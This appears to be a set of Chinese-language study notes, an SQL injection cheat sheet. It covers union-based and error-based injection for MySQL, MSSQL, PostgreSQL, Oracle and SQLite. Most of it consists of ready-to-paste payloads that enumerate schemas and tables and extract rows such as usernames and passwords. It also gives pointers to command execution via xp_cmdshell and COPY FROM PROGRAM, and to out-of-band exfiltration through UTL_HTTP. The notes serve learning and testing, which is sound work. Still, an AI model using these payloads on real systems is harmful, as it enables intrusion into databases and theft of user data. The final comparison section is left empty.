# 联合注入
子查询作为select后查询的一个字段时，结果只能返回1行1列
```

order by
cookie=1' or 1=1 order by 8#
查数据库
cookie=1' or 1=1 union select 1,2,3,4,database(),6
查数据表
cookie=1' or 1=1 union select 1,2,3,4,(select group_concat(table_name) from information_schema.tables where table_schema='web'),6
数据列
cookie=1' or 1=1 union select 1,2,3,4,(select group_concat(column_name) from information_schema.columns where table_schema='web' and table_name='flag'),6#
数据
cookie=1' or 1=1 union select 1,2,3,4,(select * from web.flag),6 #--错误
cookie=1' or 1=1 union select 1,2,3,4,(select flag from web.flag),6 #
 
```
SELECT * FROM users WHERE cookie='1' or 1=1 union select 1,2,3,4,5,database()
union子句会先执行左侧，后续在左侧数据的结果后追加
左侧的语句执行
```
SELECT * FROM users WHERE cookie='1' or '1'='1' ORDER BY 5 and '1'='1
```
![](pic/Pasted%20image%2020260914224911.png)
# 报错注入
**注意点**
MySQL 5.x（报错注入在 MySQL8 默认不支持，因为关闭了传统报错信息回显）；
limit 不能直接在报错函数里使用，需要子查询迂回
`substr` 截取字符串（报错函数有长度限制：updatexml 最多返回 32 字符，extractvalue 最多 32 字符）
**Updatexml 报错注入**（最常用）
```
updatexml(1,concat(0x7e,(select 查询语句),0x7e),1),0x7e = `~` 分隔符,方便区分报错信息
and updatexml(1,concat(0x7e,version(),0x7e),1)--+
and updatexml(1,concat(0x7e,database(),0x7e),1)--+

使用substr获取所有数据库
and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32),0x7e),1)--+
 and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),33,32),0x7e),1)--+
 
 获取指定库下所有表名（假设库名 testdb）
and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb'),1,32),0x7e),1)--+

 获取指定表下所有字段
and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='testdb' and table_name='users'),1,32),0x7e),1)--+

读取表内数据
and updatexml(1,concat(0x7e,substr((select concat(username,0x3a,password) from testdb.users limit 0,1),1,32),0x7e),1)--+

updatexml 不能直接把子查询写在 concat 里带 limit 时，
如果报错`this version of MySQL doesn't yet support 'LIMIT & IN/ALL/ANY/SOME subquery'`，需要套一层子查询（双层子查询绕过 limit 限制）：
and updatexml(1,concat(0x7e,substr((select * from (select username from testdb.users limit 0,1) as tmp),1,32),0x7e),1)--+

```
**extractvalue报错**
```
' and extractvalue(1,concat(0x7e,version(),0x7e))--+

' and extractvalue(1,concat(0x7e,database(),0x7e))--+

' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb'),1,32),0x7e))--+

' and extractvalue(1,concat(0x7e,substr((select * from (select username from testdb.users limit 0,1) as tmp),1,32),0x7e))--+
```
**Floor报错**
Floor (rand ()) 报错注入（第三种，无 32 字符限制！重点）
原理：`floor(rand()*2)` 产生重复主键触发 count 分组报错，**不受 32 字符长度限制**，不需要频繁 substr 截取。
> 注意：payload 执行可能偶尔不触发报错，多刷新几次；不适合稳定自动化，但是能一次性返回更长内容。
> ![](pic/Pasted%20image%2020260914232933.png)
```

### 获取版本
' and select count(*) from information_schema.tables group by floor(rand()*2),concat(version(),0x7e,floor(rand()*2))--+
完整可直接注入点 payload（闭合版）：
' and (select count(*) from information_schema.tables group by floor(rand()*2),concat(version(),0x7e,floor(rand()*2)))--+

当前数据库名
' and (select count(*) from information_schema.tables group by floor(rand()*2),concat(database(),0x7e,floor(rand()*2)))--+

查询所有表名 testdb
' and (select count(*) from information_schema.tables group by floor(rand()*2),concat((select group_concat(table_name) from information_schema.tables where table_schema='testdb'),0x7e,floor(rand()*2)))--+

limit 读取数据（双层子查询）
' and (select count(*) from information_schema.tables group by floor(rand()*2),concat((select * from (select username from testdb.users limit 0,1) as tmp),0x7e,floor(rand()*2)))--+
```
## 关键坑点总结

1. `updatexml / extractvalue` 限制返回**32 个字符**，长字符串必须用`substr(xxx,start,32)`分段读取
2. 直接 `select xxx limit 0,1` 放到内层子查询会报错，必须套 `select * from ( ... ) as tmp` 双层子查询绕过 MySQL 限制
3. floor 报错没有 32 字符限制，但 rand 随机，偶尔不触发报错，稳定性差
4. MySQL8.0 默认关闭报错详情，报错注入失效；只能在 MySQL5.1~5.7 环境使用
5. `group_concat` 默认最大长度 1024，大量数据时会截断，数据量大必须用 limit 循环读取每行
6. 其他支持的函数
```
geometrycollection()
' and geometrycollection(concat(0x7e,version(),0x7e))--+

multipoint()
' and multipoint(concat(0x7e,version(),0x7e))--+
polygon
' and polygon(concat(0x7e,version(),0x7e))--+
multipolygon
' and multipolygon(concat(0x7e,version(),0x7e))--+
linestring
' and linestring(concat(0x7e,version(),0x7e))--+
multilinestring
' and multilinestring(concat(0x7e,version(),0x7e))--+

exp()参数大于 709 会触发 DOUBLE overflow 溢出报错
' and exp(~(select * from (select version())a))--+
' and exp(~(select * from (select substr(database(),1,1) as x)a))--+
MySQL 版本差异大，5.5 部分版本可用，高版本修复

`gtid_subset() / gtid_subtract()`
```


## 各个数据库报错注入差异

### MySQL
（5.x 支持报错注入；MySQL8 默认关闭详细报错，报错注入失效）
**信息枚举完整流程**

```
-- 版本
' and extractvalue(1,concat(0x7e,version(),0x7e))--+
-- 当前库
' and extractvalue(1,concat(0x7e,database(),0x7e))--+
-- 所有库(substr分段)
' and extractvalue(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32),0x7e))--+
-- 指定库testdb查表
' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='testdb'),1,32),0x7e))--+
-- 查字段 users表
' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='testdb' and table_name='users'),1,32),0x7e))--+
-- 读取数据，双层子查询绕过limit限制
' and extractvalue(1,concat(0x7e,substr((select * from (select username from testdb.users limit 0,1) as tmp),1,32),0x7e))--+
```

### MSSQL（SQL Server）
类型转换错误 `convert/cast`，将字符串强行转 int，内容会出现在报错里
Payload 核心：
```
' and 1=convert(int,@@version)--+
```
**信息枚举完整流程**
```
-- 版本
' and 1=convert(int,@@version)--+
-- 当前数据库
' and 1=convert(int,db_name())--+
-- 查询所有数据库
' and 1=convert(int,(select top 1 name from master..sysdatabases))--+
-- 当前库所有用户表
' and 1=convert(int,(select top 1 name from sysobjects where xtype='U'))--+
-- users表字段
' and 1=convert(int,(select top 1 name from syscolumns where id=(select id from sysobjects where name='users')))--+
-- 读取表数据，top代替limit
' and 1=convert(int,(select top 1 username from users))--+
```

- 字符串拼接：`+`
- 延时注入：`';WAITFOR DELAY '0:0:5'--`
- 分页：`top n`；2012 + 支持 `offset ... fetch next`
- 支持堆叠查询（分号`;`），可执行`xp_cmdshell`

> 说明：MSSQL 报错注入不需要 substr 截断，一次可带出较长文本；注意`top 1`循环枚举，每次换表 / 行。

### PostgreSQL（PG）
报错注入：`cast(xxx as int)` 类型转换报错，字符串无法转为 int，内容进入报错
```
' and 1=cast(version() as int)--+
```

**信息枚举完整流程**
```
--版本
' and 1=cast(version() as int)--+
--当前库
' and 1=cast(current_database() as int)--+
--当前用户
' and 1=cast(current_user as int)--+
--public下所有表
' and 1=cast((select tablename from pg_tables where schemaname='public' limit 1 offset 0) as int)--+
--表字段
' and 1=cast((select column_name from information_schema.columns where table_name='users' limit 1 offset 0) as int)--+
--读取数据
' and 1=cast((select username from users limit 1 offset 0) as int)--+
```

- 字符串拼接：`||`
- 延时盲注：`' and pg_sleep(5)--`
- 分页：`limit 1 offset 0`，和 MySQL 类似
- 支持堆叠查询；超级用户可`COPY FROM PROGRAM`执行系统命令

---

### Oracle
Oracle 没有 MySQL 那种原生 XPath / 几何报错函数；经典报错注入使用 `CTXSYS.DRITHSX.SN`（Oracle Text 组件），需要组件存在
**报错注入 Payload**
```
' and CTXSYS.DRITHSX.SN(1,(select banner from v$version where rownum=1))--
```
原理：DRITHSX.SN 执行参数里的查询，抛出错误并回显查询结果。 备选：`UTL_INADDR.GET_HOST_NAME()` 域名解析报错、XMLType 非法 xml 报错
**信息枚举完整流程**

```
--版本
' and CTXSYS.DRITHSX.SN(1,(select banner from v$version where rownum=1))--
--当前用户
' and CTXSYS.DRITHSX.SN(1,(select user from dual))--
--所有表（当前用户）
' and CTXSYS.DRITHSX.SN(1,(select table_name from user_tables where rownum=1))--
--字段
' and CTXSYS.DRITHSX.SN(1,(select column_name from all_tab_columns where table_name='USERS' and rownum=1))--
--读取数据
' and CTXSYS.DRITHSX.SN(1,(select username from users where rownum=1))--
```

- 必须带`FROM`，无 from 必须写`FROM dual`虚拟表
- 字符串拼接：`||`
- 分页：`rownum`；`rownum=1`取第一条；取第 N 行需要子查询嵌套
- 延时：`DBMS_PIPE.RECEIVE_MESSAGE('a',5)`
- OOB 外带：`UTL_HTTP.REQUEST` 发起 http 请求带出数据

---

### SQLite

> ⚠️ SQLite**没有专门的报错注入函数**，主流利用方式：`cast(查询结果 as integer)`，字符串转整数触发报错。 SQLite 是文件型数据库，单库 = 单个文件；无多数据库概念，没有 information_schema。

报错 Payload
```
' and 1=cast((select sqlite_version()) as integer)--
```

**信息枚举完整流程**

```
--版本
' and 1=cast((select sqlite_version()) as integer)--
--获取所有表名，sqlite_master是系统表
' and 1=cast((select name from sqlite_master where type='table' limit 1 offset 0) as integer)--
--读取users表数据
' and 1=cast((select username from users limit 1 offset 0) as integer)--
```

- 字符串拼接：`||`
- 分页：`limit offset,row`
- 无延时函数，一般布尔盲注为主；可通过`load_extension`触发报错（依赖扩展开启）
- 系统表：`sqlite_master`（表、索引、视图定义）
### 对比


布尔盲注
时间盲注
